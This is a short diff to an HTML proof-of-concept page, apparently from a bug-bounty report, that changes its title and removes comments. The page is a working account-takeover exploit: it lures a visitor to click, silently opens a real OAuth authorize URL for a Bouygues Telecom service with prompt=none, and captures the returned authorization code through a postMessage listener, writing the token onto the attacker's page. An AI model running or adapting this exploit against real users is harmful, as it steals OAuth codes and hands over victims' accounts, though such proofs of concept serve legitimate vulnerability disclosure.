@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hackerone PoC</title>
+    <title>Salt PoC</title>
 </head>
 <body>
     <p>Click on the Image to give me you account!</p>
@@ -11,7 +11,6 @@
     <script>
 
     function handleOnClick() {
-      // Open the first URL and close the new tab after 10 seconds
       var newTab = window.open('https://oauth2.bouyguestelecom.fr/authorize?tmpl=bytelConnect&prompt=none&redirect_uri=https%3A%2F%2Fassets.bouyguestelecom.fr%2FPICASSO-FRONT%2Fmain%401.0.11%2Fbouyguestelecom.fr%2Fcallback.html&nonce=rAVBESXIGIrtYfU&state=DkDHMqcpb7r55BAP74_init&client_id=tribu.find.bouyguestelecom.fr&code_challenge_method=S256&response_type=code&code_challenge=PVYdz9n6iyJCd5pELWP3ejFGiXh4TUzjWwZvl6a4B94');
       setTimeout(function() {
         newTab.close();
@@ -20,11 +19,10 @@
     window.addEventListener('message', function(event) {
     console.log(event.data);
 
-    // Check if event.data contain with "authProviderToken"
     if (event.data.code) {
         document.write(`Your Access Token: ${JSON.stringify(event.data)}`);
     } else {
-        console.error('Invalid data format or missing "authProviderToken" prefix');
+        console.error('Error');
     }
 }, false);
 
